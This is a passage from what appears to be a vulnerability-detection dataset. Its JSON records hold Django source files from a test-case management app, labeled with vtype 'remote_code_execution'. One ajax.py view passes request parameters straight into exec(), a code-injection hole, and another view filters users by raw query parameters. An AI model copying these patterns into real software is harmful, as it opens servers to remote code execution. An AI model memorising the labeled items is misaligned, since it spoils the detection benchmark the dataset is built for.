context_data)\n\n\n@permission_required('testcases.add_testcase')\ndef clone(request, template_name='case/clone.html'):\n    \"\"\"Clone one case or multiple case into other plan or plans\"\"\"\n\n    request_data = getattr(request, request.method)\n\n    if 'selectAll' not in request_data and 'case' not in request_data:\n        messages.add_message(request,\n                             messages.ERROR,\n                             _('At least one TestCase is required'))\n        # redirect back where we came from\n        return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))\n\n    tp_src = plan_from_request_or_none(request)\n    tp = None\n    search_plan_form = SearchPlanForm()\n\n    # Do the clone action\n    if request.method == 'POST':\n        clone_form = CloneCaseForm(request.POST)\n        clone_form.populate(case_ids=request.POST.getlist('case'))\n\n        if clone_form.is_valid():\n            tcs_src = clone_form.cleaned_data['case']\n            for tc_src in tcs_src:\n                if clone_form.cleaned_data['copy_case']:\n                    tc_dest = TestCase.objects.create(\n                        is_automated=tc_src.is_automated,\n                        is_automated_proposed=tc_src.is_automated_proposed,\n                        script=tc_src.script,\n                        arguments=tc_src.arguments,\n                        extra_link=tc_src.extra_link,\n                        summary=tc_src.summary,\n                        requirement=tc_src.requirement,\n                        alias=tc_src.alias,\n                        estimated_time=tc_src.estimated_time,\n                        case_status=TestCaseStatus.get_PROPOSED(),\n                        category=tc_src.category,\n                        priority=tc_src.priority,\n                        notes=tc_src.notes,\n                        author=clone_form.cleaned_data[\n                            'maintain_case_orignal_author'] and\n                        tc_src.author or request.user,\n                        default_tester=clone_form.cleaned_data[\n                            'maintain_case_orignal_default_tester'] and\n                        tc_src.author or request.user,\n                    )\n\n                    for tp in clone_form.cleaned_data['plan']:\n                        # copy a case and keep origin case's sortkey\n                        if tp_src:\n                            try:\n                                tcp = TestCasePlan.objects.get(plan=tp_src,\n                                                               case=tc_src)\n                                sortkey = tcp.sortkey\n                            except ObjectDoesNotExist:\n                                sortkey = tp.get_case_sortkey()\n                        else:\n                            sortkey = tp.get_case_sortkey()\n\n                        tp.add_case(tc_dest, sortkey)\n\n                    tc_dest.add_text(\n                        author=clone_form.cleaned_data[\n                            'maintain_case_orignal_author'] and\n                        tc_src.author or request.user,\n                        create_date=tc_src.latest_text().create_date,\n                        action=tc_src.latest_text().action,\n                        effect=tc_src.latest_text().effect,\n                        setup=tc_src.latest_text().setup,\n                        breakdown=tc_src.latest_text().breakdown\n                    )\n\n                    for tag in tc_src.tag.all():\n                        tc_dest.add_tag(tag=tag)\n                else:\n                    tc_dest = tc_src\n                    tc_dest.author = \\\n                        clone_form.cleaned_data[\n                            'maintain_case_orignal_author'] \\\n                        and tc_src.author or request.user\n                    tc_dest.default_tester = \\\n                        clone_form.cleaned_data[\n                            'maintain_case_orignal_default_tester'] \\\n                        and tc_src.author or request.user\n                    tc_dest.save()\n                    for tp in clone_form.cleaned_data['plan']:\n                        # create case link and keep origin plan's sortkey\n                        if tp_src:\n                            try:\n                                tcp = TestCasePlan.objects.get(plan=tp_src,\n                                                               case=tc_dest)\n                                sortkey = tcp.sortkey\n                            except ObjectDoesNotExist:\n                                sortkey = tp.get_case_sortkey()\n                        else:\n                            sortkey = tp.get_case_sortkey()\n\n                        tp.add_case(tc_dest, sortkey)\n\n                # Add the cases to plan\n                for tp in clone_form.cleaned_data['plan']:\n                    # Clone the categories to new product\n                    if clone_form.cleaned_data['copy_case']:\n                        try:\n                            tc_category = tp.product.category.get(\n                                name=tc_src.category.name\n                            )\n                        except ObjectDoesNotExist:\n                            tc_category = tp.product.category.create(\n                                name=tc_src.category.name,\n                                description=tc_src.category.description,\n                            )\n\n                        tc_dest.category = tc_category\n                        tc_dest.save()\n                        del tc_category\n\n                    # Clone the components to new product\n                    if clone_form.cleaned_data['copy_component'] and \\\n                            clone_form.cleaned_data['copy_case']:\n                        for component in tc_src.component.all():\n                            try:\n                                new_c = tp.product.component.get(\n                                    name=component.name\n                                )\n                            except ObjectDoesNotExist:\n                                new_c = tp.product.component.create(\n                                    name=component.name,\n                                    initial_owner=request.user,\n                                    description=component.description,\n                                )\n\n                            tc_dest.add_component(new_c)\n\n            # Detect the number of items and redirect to correct one\n            cases_count = len(clone_form.cleaned_data['case'])\n            plans_count = len(clone_form.cleaned_data['plan'])\n\n            if cases_count == 1 and plans_count == 1:\n                return HttpResponseRedirect('%s?from_plan=%s' % (\n                    reverse('testcases-get', args=[tc_dest.pk, ]),\n                    tp.pk\n                ))\n\n            if cases_count == 1:\n                return HttpResponseRedirect(\n                    reverse('testcases-get', args=[tc_dest.pk, ])\n                )\n\n            if plans_count == 1:\n                return HttpResponseRedirect(\n                    reverse('test_plan_url_short', args=[tp.pk, ])\n                )\n\n            # Otherwise it will prompt to user the clone action is successful.\n            messages.add_message(request,\n                                 messages.SUCCESS,\n                                 _('TestCase cloning was successful'))\n            return HttpResponseRedirect(reverse('plans-all'))\n    else:\n        selected_cases = get_selected_testcases(request)\n        # Initial the clone case form\n        clone_form = CloneCaseForm(initial={\n            'case': selected_cases,\n            'copy_case': False,\n            'maintain_case_orignal_author': False,\n            'maintain_case_orignal_default_tester': False,\n            'copy_component': True,\n        })\n        clone_form.populate(case_ids=selected_cases)\n\n    # Generate search plan form\n    if request_data.get('from_plan'):\n        tp = TestPlan.objects.get(plan_id=request_data['from_plan'])\n        search_plan_form = SearchPlanForm(\n            initial={'product': tp.product_id, 'is_active': True})\n        search_plan_form.populate(product_id=tp.product_id)\n\n    submit_action = request_data.get('submit', None)\n    context_data = {\n        'test_plan': tp,\n        'search_form': search_plan_form,\n        'clone_form': clone_form,\n        'submit_action': submit_action,\n    }\n    return render(request, template_name, context_data)\n\n\n@require_POST\n@permission_required('testcases.add_testcasecomponent')\ndef component(request):\n    \"\"\"\n    Management test case components\n    \"\"\"\n    # FIXME: It will update product/category/component at one time so far.\n    # We may disconnect the component from case product in future.\n    cas = actions.ComponentActions(request)\n    action = request.POST.get('a', 'render_form')\n    func = getattr(cas, action.lower())\n    return func()\n\n\n@require_POST\n@permission_required('testcases.add_testcasecomponent')\ndef category(request):\n    \"\"\"Management test case categories\"\"\"\n    # FIXME: It will update product/category/component at one time so far.\n    # We may disconnect the component from case product in future.\n    cas = actions.CategoryActions(request)\n    func = getattr(cas, request.POST.get('a', 'render_form').lower())\n    return func()\n\n\n@permission_required('testcases.add_testcaseattachment')\ndef attachment(request, case_id, template_name='case/attachment.html'):\n    \"\"\"Manage test case attachments\"\"\"\n\n    tc = get_object_or_404(TestCase, case_id=case_id)\n    tp = plan_from_request_or_none(request)\n\n    context_data = {\n        'testplan': tp,\n        'testcase': tc,\n        'limit': settings.FILE_UPLOAD_MAX_SIZE,\n    }\n    return render(request, template_name, context_data)\n\n\ndef get_log(request, case_id, template_name=\"management/get_log.html\"):\n    \"\"\"Get the case log\"\"\"\n    tc = get_object_or_404(TestCase, case_id=case_id)\n\n    context_data = {\n        'object': tc\n    }\n    return render(request, template_name, context_data)\n\n\n@permission_required('testcases.change_bug')\ndef bug(request, case_id, template_name='case/get_bug.html'):\n    \"\"\"Process the bugs for cases\"\"\"\n    # FIXME: Rewrite these codes for Ajax.Request\n    tc = get_object_or_404(TestCase, case_id=case_id)\n\n    class CaseBugActions(object):\n        __all__ = ['get_form', 'render', 'add', 'remove']\n\n        def __init__(self, request, case, template_name):\n            self.request = request\n            self.case = case\n            self.template_name = template_name\n\n        def render_form(self):\n            form = CaseBugForm(initial={\n                'case': self.case,\n            })\n            if request.GET.get('type') == 'table':\n                return HttpResponse(form.as_table())\n\n            return HttpResponse(form.as_p())\n\n        def render(self, response=None):\n            context_data = {\n                'test_case': self.case,\n                'response': response\n            }\n            return render(request, template_name, context_data)\n\n        def add(self):\n            # FIXME: It's may use ModelForm.save() method here.\n            #        Maybe in future.\n            if not self.request.user.has_perm('testcases.add_bug'):\n                return self.render(response='Permission denied.')\n\n            form = CaseBugForm(request.GET)\n            if not form.is_valid():\n                errors = []\n                for field_name, error_messages in form.errors.items():\n                    for item in error_messages:\n                        errors.append(item)\n                response = '\\n'.join(errors)\n                return self.render(response=response)\n\n            try:\n                self.case.add_bug(\n                    bug_id=form.cleaned_data['bug_id'],\n                    bug_system_id=form.cleaned_data['bug_system'].pk,\n                    summary=form.cleaned_data['summary'],\n                    description=form.cleaned_data['description'],\n                )\n            except Exception as e:\n                return self.render(response=str(e))\n\n            return self.render()\n\n        def remove(self):\n            if not request.user.has_perm('testcases.delete_bug'):\n                return self.render(response='Permission denied.')\n\n            try:\n                self.case.remove_bug(request.GET.get('id'), request.GET.get('run_id'))\n            except ObjectDoesNotExist as error:\n                return self.render(response=error)\n\n            return self.render()\n\n    case_bug_actions = CaseBugActions(\n        request=request,\n        case=tc,\n        template_name=template_name\n    )\n\n    if not request.GET.get('handle') in case_bug_actions.__all__:\n        return case_bug_actions.render(response='Unrecognizable actions')\n\n    func = getattr(case_bug_actions, request.GET['handle'])\n    return func()\n\n\n@require_GET\ndef plan(request, case_id):\n    \"\"\"Add and remove plan in plan tab\"\"\"\n    tc = get_object_or_404(TestCase, case_id=case_id)\n    if request.GET.get('a'):\n        # Search the plans from database\n        if not request.GET.getlist('plan_id'):\n            context_data = {\n                'message': 'The case must specific one plan at leaset for '\n                           'some action',\n            }\n            return render(\n                request,\n                'case/get_plan.html',\n                context_data)\n\n        tps = TestPlan.objects.filter(pk__in=request.GET.getlist('plan_id'))\n\n        if not tps:\n            context_data = {\n                'testplans': tps,\n                'message': 'The plan id are not exist in database at all.'\n            }\n            return render(\n                request,\n                'case/get_plan.html',\n                context_data)\n\n        # Add case plan action\n        if request.GET['a'] == 'add':\n            if not request.user.has_perm('testcases.add_testcaseplan'):\n                context_data = {\n                    'test_case': tc,\n                    'test_plans': tps,\n                    'message': 'Permission denied',\n                }\n                return render(\n                    request,\n                    'case/get_plan.html',\n                    context_data)\n\n            for tp in tps:\n                tc.add_to_plan(tp)\n\n        # Remove case plan action\n        if request.GET['a'] == 'remove':\n            if not request.user.has_perm('testcases.change_testcaseplan'):\n                context_data = {\n                    'test_case': tc,\n                    'test_plans': tps,\n                    'message': 'Permission denied',\n                }\n                return render(\n                    request,\n                    'case/get_plan.html',\n                    context_data)\n\n            for tp in tps:\n                tc.remove_plan(tp)\n\n    tps = tc.plan.all()\n    tps = tps.select_related('author',\n                             'type',\n                             'product')\n\n    context_data = {\n        'test_case': tc,\n        'test_plans': tps,\n    }\n    return render(\n        request,\n        'case/get_plan.html',\n        context_data)\n/n/n/ntcms/urls.py/n/n# -*- coding: utf-8 -*-\n\nfrom django.conf import settings\nfrom django.conf.urls import include, url\nfrom django.conf.urls.static import static\nfrom django.contrib import admin\nfrom django.views.i18n import JavaScriptCatalog\n\nfrom grappelli import urls as grappelli_urls\nfrom attachments import urls as attachments_urls\nfrom modernrpc.core import JSONRPC_PROTOCOL\nfrom modernrpc.core import XMLRPC_PROTOCOL\nfrom modernrpc.views import RPCEntryPoint\nfrom tinymce import urls as tinymce_urls\nfrom tcms.core import ajax\nfrom tcms.core import views as core_views\nfrom tcms.core.contrib.comments import views as comments_views\nfrom tcms.core.contrib.linkreference import views as linkreference_views\nfrom tcms.profiles import urls as profiles_urls\nfrom tcms.testplans import urls as testplans_urls\nfrom tcms.testcases import urls as testcases_urls\nfrom tcms.testruns import urls as testruns_urls\nfrom tcms.testruns import views as testruns_views\nfrom tcms.management import views as management_views\nfrom tcms.report import urls as report_urls\nfrom tcms.search import advance_search\n\n\nurlpatterns = [\n    # iframe navigation workaround\n    url(r'^navigation/', core_views.navigation, name='iframe-navigation'),\n\n    url(r'^grappelli/', include(grappelli_urls)),\n    url(r'^admin/', admin.site.urls),\n\n    url(r'^attachments/', include(attachments_urls, namespace='attachments')),\n    url(r'^tinymce/', include(tinymce_urls)),\n\n    # Index and static zone\n    url(r'^$', core_views.index, name='core-views-index'),\n    url(r'^xml-rpc/', RPCEntryPoint.as_view(protocol=XMLRPC_PROTOCOL), name='xml-rpc'),\n    url(r'^json-rpc/$', RPCEntryPoint.as_view(protocol=JSONRPC_PROTOCOL)),\n\n    # Ajax call responder\n    url(r'^ajax/update/$', ajax.update, name='ajax-update'),\n    url(r'^ajax/update/case-status/$', ajax.update_cases_case_status),\n    url(r'^ajax/update/case-run-status$', ajax.update_case_run_status,\n        name='ajax-update_case_run_status'),\n    url(r'^ajax/update/cases-priority/$', ajax.update_cases_priority),\n    url(r'^ajax/update/cases-default-tester/$', ajax.update_cases_default_tester,\n        name='ajax-update_cases_default_tester'),\n    url(r'^ajax/update/cases-reviewer/$', ajax.update_cases_reviewer),\n    url(r'^ajax/update/cases-sortkey/$', ajax.update_cases_sortkey),\n    url(r'^ajax/get-prod-relate-obj/$', ajax.get_prod_related_obj_json),\n    url(r'^management/getinfo/$', ajax.info, name='ajax-info'),\n    url(r'^management/tags/$', ajax.tags, name='ajax-tags'),\n\n    # comments\n    url(r'^comments/post/', comments_views.post, name='comments-post'),\n    url(r'^comments/delete/', comments_views.delete, name='comments-delete'),\n\n    # Account information zone, such as login method\n    url(r'^accounts/', include(profiles_urls)),\n\n    # Testplans zone\n    url(r'^plan/', include(testplans_urls.plan_urls)),\n    url(r'^plans/', include(testplans_urls.plans_urls)),\n\n    # Testcases zone\n    url(r'^case/', include(testcases_urls.case_urls)),\n    url(r'^cases/', include(testcases_urls.cases_urls)),\n\n    # Testruns zone\n    url(r'^run/', include(testruns_urls.run_urls)),\n    url(r'^runs/', include(testruns_urls.runs_urls)),\n\n    url(r'^caseruns/$', testruns_views.caseruns),\n    url(r'^caserun/(?P<case_run_id>\\d+)/bug/$', testruns_views.bug, name='testruns-bug'),\n    url(r'^caserun/comment-many/', ajax.comment_case_runs, name='ajax-comment_case_runs'),\n    url(r'^caserun/update-bugs-for-many/', ajax.update_bugs_to_caseruns),\n\n    url(r'^linkref/add/$', linkreference_views.add, name='linkref-add'),\n    url(r'^linkref/remove/(?P<link_id>\\d+)/$', linkreference_views.remove),\n\n    # Management zone\n    url(r'^environment/groups/$', management_views.environment_groups,\n        name='mgmt-environment_groups'),\n    url(r'^environment/group/edit/$', management_views.environment_group_edit,\n        name='mgmt-environment_group_edit'),\n    url(r'^environment/properties/$', management_views.environment_properties,\n        name='mgmt-environment_properties'),\n    url(r'^environment/properties/values/$', management_views.environment_property_values,\n        name='mgmt-environment_property_values'),\n\n    # Report zone\n    url(r'^report/', include(report_urls)),\n\n    # Advance search\n    url(r'^advance-search/$', advance_search, name='advance_search'),\n\n    # TODO: do we need this at all ???\n    # Using admin js without admin permission\n    # https://docs.djangoproject.com/en/1.11/topics/i18n/translation/#django.views.i18n.JavaScriptCatalog\n    url(r'^jsi18n/$', JavaScriptCatalog.as_view()),\n]\n\n# Debug zone\n\nif settings.DEBUG:\n    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)\n\n    try:\n        import debug_toolbar\n\n        urlpatterns += [\n            url(r'^__debug__/', include(debug_toolbar.urls)),\n        ]\n    # in case we're trying to debug in production\n    # and debug_toolbar is not installed\n    except ImportError:\n        pass\n\n# Overwrite default 500 handler\n# More details could see django.core.urlresolvers._resolve_special()\nhandler500 = 'tcms.core.views.error.server_error'\n/n/n/n", "label": 0, "vtype": "remote_code_execution"}, {"id": "bb986000ed3cb222832e1e4535dd6316d32503f8", "code": "/tcms/core/ajax.py/n/n# -*- coding: utf-8 -*-\n\"\"\"\nShared functions for plan/case/run.\n\nMost of these functions are use for Ajax.\n\"\"\"\nimport datetime\nimport sys\nimport json\nfrom distutils.util import strtobool\n\nfrom django import http\nfrom django.db.models import Q, Count\nfrom django.contrib.auth.models import User\nfrom django.core import serializers\nfrom django.core.exceptions import ObjectDoesNotExist\nfrom django.apps import apps\nfrom django.forms import ValidationError\nfrom django.http import Http404\nfrom django.http import HttpResponse\nfrom django.shortcuts import render\nfrom django.views.decorators.http import require_GET\nfrom django.views.decorators.http import require_POST\n\nfrom tcms.signals import POST_UPDATE_SIGNAL\nfrom tcms.management.models import Component, Build, Version\nfrom tcms.management.models import Priority\nfrom tcms.management.models import Tag\nfrom tcms.management.models import EnvGroup, EnvProperty, EnvValue\nfrom tcms.testcases.models import TestCase, Bug\nfrom tcms.testcases.models import Category\nfrom tcms.testcases.models import TestCaseStatus, TestCaseTag\nfrom tcms.testcases.views import plan_from_request_or_none\nfrom tcms.testplans.models import TestPlan, TestCasePlan, TestPlanTag\nfrom tcms.testruns.models import TestRun, TestCaseRun, TestCaseRunStatus, TestRunTag\nfrom tcms.core.helpers.comments import add_comment\nfrom tcms.core.utils.validations import validate_bug_id\n\n\ndef check_permission(request, ctype):\n    perm = '%s.change_%s' % tuple(ctype.split('.'))\n    if request.user.has_perm(perm):\n        return True\n    return False\n\n\ndef strip_parameters(request_dict, skip_parameters):\n    parameters = {}\n    for key, value in request_dict.items():\n        if key not in skip_parameters and value:\n            parameters[str(key)] = value\n\n    return parameters\n\n\n@require_GET\ndef info(request):\n    \"\"\"Ajax responder for misc information\"\"\"\n\n    objects = _InfoObjects(request=request, product_id=request.GET.get('product_id'))\n    info_type = getattr(objects, request.GET.get('info_type'))\n\n    if not info_type:\n        return HttpResponse('Unrecognizable info-type')\n\n    if request.GET.get('format') == 'ulli':\n        field = request.GET.get('field', default='name')\n\n        response_str = '<ul>'\n        for obj_value in info_type().values(field):\n            response_str += '<li>' + obj_value.get(field, None) + '</li>'\n        response_str += '</ul>'\n\n        return HttpResponse(response_str)\n\n    return HttpResponse(serializers.serialize('json', info_type(), fields=('name', 'value')))\n\n\nclass _InfoObjects(object):\n\n    def __init__(self, request, product_id=None):\n        self.request = request\n        try:\n            self.product_id = int(product_id)\n        except (ValueError, TypeError):\n            self.product_id = 0\n\n    def builds(self):\n        try:\n            is_active = strtobool(self.request.GET.get('is_active', default='False'))\n        except (ValueError, TypeError):\n            is_active = False\n\n        return Build.objects.filter(product_id=self.product_id, is_active=is_active)\n\n    def categories(self):\n        return Category.objects.filter(product__id=self.product_id)\n\n    def components(self):\n        return Component.objects.filter(product__id=self.product_id)\n\n    def env_groups(self):\n        return EnvGroup.objects.all()\n\n    def env_properties(self):\n        if self.request.GET.get('env_group_id'):\n            return EnvGroup.objects.get(id=self.request.GET['env_group_id']).property.all()\n        return EnvProperty.objects.all()\n\n    def env_values(self):\n        return EnvValue.objects.filter(property__id=self.request.GET.get('env_property_id'))\n\n    def users(self):\n        query = strip_parameters(self.request.GET, skip_parameters=('info_type', 'field', 'format'))\n        return User.objects.filter(**query)\n\n    def versions(self):\n        return Version.objects.filter(product__id=self.product_id)\n\n\n@require_GET\ndef form(request):\n    \"\"\"Response get form ajax call, most using in dialog\"\"\"\n\n    # The parameters in internal_parameters will delete from parameters\n    internal_parameters = ['app_form', 'format']\n    parameters = strip_parameters(request.GET, internal_parameters)\n    q_app_form = request.GET.get('app_form')\n    q_format = request.GET.get('format')\n    if not q_format:\n        q_format = 'p'\n\n    if not q_app_form:\n        return HttpResponse('Unrecognizable app_form')\n\n    # Get the form\n    q_app, q_form = q_app_form.split('.')[0], q_app_form.split('.')[1]\n    exec('from tcms.%s.forms import %s as form' % (q_app, q_form))\n    __import__('tcms.%s.forms' % q_app)\n    q_app_module = sys.modules['tcms.%s.forms' % q_app]\n    form_class = getattr(q_app_module, q_form)\n    form_params = form_class(initial=parameters)\n\n    # Generate the HTML and reponse\n    html = getattr(form_params, 'as_' + q_format)\n    return HttpResponse(html())\n\n\ndef tags(request):\n    \"\"\" Get tags for TestPlan, TestCase or TestRun \"\"\"\n\n    tag_objects = _TagObjects(request)\n    template_name, obj = tag_objects.get()\n\n    q_tag = request.GET.get('tags')\n    q_action = request.GET.get('a')\n\n    if q_action:\n        tag_actions = _TagActions(obj=obj, tag_name=q_tag)\n        getattr(tag_actions, q_action)()\n\n    all_tags = obj.tag.all().order_by('pk')\n    test_plan_tags = TestPlanTag.objects.filter(\n        tag__in=all_tags).values('tag').annotate(num_plans=Count('tag')).order_by('tag')\n    test_case_tags = TestCaseTag.objects.filter(\n        tag__in=all_tags).values('tag').annotate(num_cases=Count('tag')).order_by('tag')\n    test_run_tags = TestRunTag.objects.filter(\n        tag__in=all_tags).values('tag').annotate(num_runs=Count('tag')).order_by('tag')\n\n    plan_counter = _TagCounter('num_plans', test_plan_tags)\n    case_counter = _TagCounter('num_cases', test_case_tags)\n    run_counter = _TagCounter('num_runs', test_run_tags)\n\n    for tag in all_tags:\n        tag.num_plans = plan_counter.calculate_tag_count(tag)\n        tag.num_cases = case_counter.calculate_tag_count(tag)\n        tag.num_runs = run_counter.calculate_tag_count(tag)\n\n    context_data = {\n        'tags': all_tags,\n        'object': obj,\n    }\n    return render(request, template_name, context_data)\n\n\nclass _TagObjects(object):\n    \"\"\" Used for getting the chosen object(TestPlan, TestCase or TestRun) from the database \"\"\"\n\n    def __init__(self, request):\n        \"\"\"\n        :param request: An HTTP GET request, containing the primary key\n                        and the type of object to be selected\n        :type request: HttpRequest\n        \"\"\"\n        for obj in ['plan', 'case', 'run']:\n            if request.GET.get(obj):\n                self.object = obj\n                self.object_pk = request.GET.get(obj)\n                break\n\n    def get(self):\n        func = getattr(self, self.object)\n        return func()\n\n    def plan(self):\n        return 'management/get_tag.html', TestPlan.objects.get(pk=self.object_pk)\n\n    def case(self):\n        return 'management/get_tag.html', TestCase.objects.get(pk=self.object_pk)\n\n    def run(self):\n        return 'run/get_tag.html', TestRun.objects.get(pk=self.object_pk)\n\n\nclass _TagActions(object):\n    \"\"\" Used for performing the 'add' and 'remove' actions on a given tag \"\"\"\n\n    def __init__(self, obj, tag_name):\n        \"\"\"\n        :param obj: the object for which the tag actions would be performed\n        :type obj: either a :class:`tcms.testplans.models.TestPlan`,\n                          a :class:`tcms.testcases.models.TestCase` or\n                          a :class:`tcms.testruns.models.TestRun`\n        :param tag_name: The name of the tag to be manipulated\n        :type tag_name: str\n        \"\"\"\n        self.obj = obj\n        self.tag_name = tag_name\n\n    def add(self):\n        tag, _ = Tag.objects.get_or_create(name=self.tag_name)\n        self.obj.add_tag(tag)\n\n    def remove(self):\n        tag = Tag.objects.get(name=self.tag_name)\n        self.obj.remove_tag(tag)\n\n\nclass _TagCounter(object):\n    \"\"\" Used for counting the number of times a tag is assigned to TestRun/TestCase/TestPlan \"\"\"\n\n    def __init__(self, key, test_tags):\n        \"\"\"\n         :param key: either 'num_plans', 'num_cases', 'num_runs', depending on what you want count\n         :type key: str\n         :param test_tags: query set, containing the Tag->Object relationship, ordered by tag and\n                            annotated by key\n            e.g. TestPlanTag, TestCaseTag ot TestRunTag\n         :type test_tags: QuerySet\n        \"\"\"\n        self.key = key\n        self.test_tags = iter(test_tags)\n        self.counter = {'tag': 0}\n\n    def calculate_tag_count(self, tag):\n        \"\"\"\n        :param tag: the tag you do the counting for\n        :type tag: :class:`tcms.management.models.Tag`\n        :return: the number of times a tag is assigned to object\n        :rtype: int\n        \"\"\"\n        if self.counter['tag'] != tag.pk:\n            try:\n                self.counter = self.test_tags.__next__()\n            except StopIteration:\n                return 0\n\n        if tag.pk == self.counter['tag']:\n            return self.counter[self.key]\n        return 0\n\n\ndef get_value_by_type(val, v_type):\n    \"\"\"\n    Exampls:\n    1. get_value_by_type('True', 'bool')\n    (1, None)\n    2. get_value_by_type('19860624 123059', 'datetime')\n    (datetime.datetime(1986, 6, 24, 12, 30, 59), None)\n    3. get_value_by_type('5', 'int')\n    ('5', None)\n    4. get_value_by_type('string', 'str')\n    ('string', None)\n    5. get_value_by_type('everything', 'None')\n    (None, None)\n    6. get_value_by_type('buggy', 'buggy')\n    (None, 'Unsupported value type.')\n    7. get_value_by_type('string', 'int')\n    (None, \"invalid literal for int() with base 10: 'string'\")\n    \"\"\"\n    value = error = None\n\n    def get_time(time):\n        date_time = datetime.datetime\n        if time == 'NOW':\n            return date_time.now()\n        return date_time.strptime(time, '%Y%m%d %H%M%S')\n\n    pipes = {\n        # Temporary solution is convert all of data to str\n        # 'bool': lambda x: x == 'True',\n        'bool': lambda x: x == 'True' and 1 or 0,\n        'datetime': get_time,\n        'int': lambda x: str(int(x)),\n        'str': lambda x: str(x),\n        'None': lambda x: None,\n    }\n    pipe = pipes.get(v_type, None)\n    if pipe is None:\n        error = 'Unsupported value type.'\n    else:\n        try:\n            value = pipe(val)\n        except Exception as e:\n            error = str(e)\n    return value, error\n\n\ndef say_no(error_msg):\n    ajax_response = {'rc': 1, 'response': error_msg}\n    return HttpResponse(json.dumps(ajax_response))\n\n\ndef say_yes():\n    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))\n\n\n# Deprecated. Not flexible.\n@require_POST\ndef update(request):\n    \"\"\"\n    Generic approach to update a model,\\n\n    based on contenttype.\n    \"\"\"\n    now = datetime.datetime.now()\n\n    data = request.POST.copy()\n    ctype = data.get(\"content_type\")\n    vtype = data.get('value_type', 'str')\n    object_pk_str = data.get(\"object_pk\")\n    field = data.get('field')\n    value = data.get('value')\n\n    object_pk = [int(a) for a in object_pk_str.split(',')]\n\n    if not field or not value or not object_pk or not ctype:\n        return say_no(\n            'Following fields are required - content_type, '\n            'object_pk, field and value.')\n\n    # Convert the value type\n    # FIXME: Django bug here: update() keywords must be strings\n    field = str(field)\n\n    value, error = get_value_by_type(value, vtype)\n    if error:\n        return say_no(error)\n    has_perms = check_permission(request, ctype)\n    if not has_perms:\n        return say_no('Permission Dinied.')\n\n    model = apps.get_model(*ctype.split(\".\", 1))\n    targets = model._default_manager.filter(pk__in=object_pk)\n\n    if not targets:\n        return say_no('No record found')\n    if not hasattr(targets[0], field):\n        return say_no('%s has no field %s' % (ctype, field))\n\n    if hasattr(targets[0], 'log_action'):\n        for t in targets:\n            try:\n                t.log_action(\n                    who=request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        field, getattr(t, field), value\n                    )\n                )\n            except (AttributeError, User.DoesNotExist):\n                pass\n    objects_update(targets, **{field: value})\n\n    if hasattr(model, 'mail_scene'):\n        mail_context = model.mail_scene(\n            objects=targets, field=field, value=value, ctype=ctype,\n            object_pk=object_pk,\n        )\n        if mail_context:\n            from tcms.core.utils.mailto import mailto\n\n            mail_context['context']['user'] = request.user\n            try:\n                mailto(**mail_context)\n            except Exception:  # nosec:B110:try_except_pass\n                pass\n\n    # Special hacking for updating test case run status\n    if ctype == 'testruns.testcaserun' and field == 'case_run_status':\n        for t in targets:\n            field = 'close_date'\n            t.log_action(\n                who=request.user,\n                action='Field %s changed from %s to %s.' % (\n                    field, getattr(t, field), now\n                )\n            )\n            if t.tested_by != request.user:\n                field = 'tested_by'\n                t.log_action(\n                    who=request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        field, getattr(t, field), request.user\n                    )\n                )\n\n            field = 'assignee'\n            try:\n                assignee = t.assginee\n                if assignee != request.user:\n                    t.log_action(\n                        who=request.user,\n                        action='Field %s changed from %s to %s.' % (\n                            field, getattr(t, field), request.user\n                        )\n                    )\n                    # t.assignee = request.user\n                t.save()\n            except (AttributeError, User.DoesNotExist):\n                pass\n        targets.update(close_date=now, tested_by=request.user)\n    return say_yes()\n\n\n@require_POST\ndef update_case_run_status(request):\n    \"\"\"\n    Update Case Run status.\n    \"\"\"\n    now = datetime.datetime.now()\n\n    data = request.POST.copy()\n    ctype = data.get(\"content_type\")\n    vtype = data.get('value_type', 'str')\n    object_pk_str = data.get(\"object_pk\")\n    field = data.get('field')\n    value = data.get('value')\n\n    object_pk = [int(a) for a in object_pk_str.split(',')]\n\n    if not field or not value or not object_pk or not ctype:\n        return say_no(\n            'Following fields are required - content_type, '\n            'object_pk, field and value.')\n\n    # Convert the value type\n    # FIXME: Django bug here: update() keywords must be strings\n    field = str(field)\n\n    value, error = get_value_by_type(value, vtype)\n    if error:\n        return say_no(error)\n    has_perms = check_permission(request, ctype)\n    if not has_perms:\n        return say_no('Permission Dinied.')\n\n    model = apps.get_model(*ctype.split(\".\", 1))\n    targets = model._default_manager.filter(pk__in=object_pk)\n\n    if not targets:\n        return say_no('No record found')\n    if not hasattr(targets[0], field):\n        return say_no('%s has no field %s' % (ctype, field))\n\n    if hasattr(targets[0], 'log_action'):\n        for t in targets:\n            try:\n                t.log_action(\n                    who=request.user,\n                    action='Field {} changed from {} to {}.'.format(\n                        field,\n                        getattr(t, field),\n                        TestCaseRunStatus.id_to_string(value),\n                    )\n                )\n            except (AttributeError, User.DoesNotExist):\n                pass\n    objects_update(targets, **{field: value})\n\n    if hasattr(model, 'mail_scene'):\n        from tcms.core.utils.mailto import mailto\n\n        mail_context = model.mail_scene(\n            objects=targets, field=field, value=value, ctype=ctype,\n            object_pk=object_pk,\n        )\n        if mail_context:\n            mail_context['context']['user'] = request.user\n            try:\n                mailto(**mail_context)\n            except Exception:  # nosec:B110:try_except_pass\n                pass\n\n    # Special hacking for updating test case run status\n    if ctype == 'testruns.testcaserun' and field == 'case_run_status':\n        for t in targets:\n            field = 'close_date'\n            t.log_action(\n                who=request.user,\n                action='Field %s changed from %s to %s.' % (\n                    field, getattr(t, field), now\n                )\n            )\n            if t.tested_by != request.user:\n                field = 'tested_by'\n                t.log_action(\n                    who=request.user,\n                    action='Field %s changed from %s to %s.' % (\n                        field, getattr(t, field), request.user\n                    )\n                )\n\n            field = 'assignee'\n            try:\n                assignee = t.assginee\n                if assignee != request.user:\n                    t.log_action(\n                        who=request.user,\n                        action='Field %s changed from %s to %s.' % (\n                            field, getattr(t, field), request.user\n                        )\n                    )\n                    # t.assignee = request.user\n                t.save()\n            except (AttributeError, User.DoesNotExist):\n                pass\n        targets.update(close_date=now, tested_by=request.user)\n\n    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))\n\n\nclass ModelUpdateActions(object):\n    \"\"\"Abstract class defining interfaces to update a model properties\"\"\"\n\n\nclass TestCaseUpdateActions(ModelUpdateActions):\n    \"\"\"Actions to update each possible proprety of TestCases\n\n    Define your own method named _update_[property name] to hold specific\n    update 